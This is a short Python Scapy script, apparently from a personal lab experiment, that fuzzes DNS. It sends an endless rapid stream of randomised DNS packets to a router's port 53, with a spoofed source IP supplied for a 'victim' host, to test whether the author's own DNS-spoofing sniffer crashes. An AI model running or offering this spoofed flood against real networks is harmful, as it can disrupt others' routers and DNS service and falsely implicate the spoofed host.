#!/usr/bin/python


# this is a dns fuzzer, sent from the victim's host
# the dns fuzzer will send alot of random IP/TCP/DNS data to port 53 of the router
# this will then be sniffed by the attacker who is running the sniffer to sniff and forge dns pkts
# the experiment is to do the dns spoof on self, and while sniffing my own traffic, we can activate this following script
# this is a fuzzer that is repeatdly sent to the router, without any real information. 
# my own dns spoofer will sniff the fuzzed traffic, alot of it, as quickly as the fuzzer is sending these packets
# however it did not crash the system. 



# import modules

from scapy.all import *
import sys


pkt = fuzz(IP()/UDP()/DNS())

# setting IP configs
#pkt[IP].src = '192.168.1.30'
#pkt[IP].dst = '192.168.1.1'
try: 
    pkt[IP].src = raw_input("Please enter the victim's IP: ")
    pkt[IP].dst = raw_input("Please enter the gateway Router's IP: ")
except KeyboardInterrupt:
    print "[!] EXITING..."
    sys.exit(0)


# setting UDP config
pkt[UDP].dport = 53 #53 for dns port

# setting DNS configs
    #none at the time

#sending this packet as many times as we could and as fast as we could
    # this is so the dns sniffer from the dns spoofer attacker can be potentially crashed?
        # test out the experiment 
try: 
    while True:
        send(pkt, loop=1, inter=0.01, verbose=1)
except KeyboardInterrupt:
    print "[!] EXITING..."
    sys.exit(0)



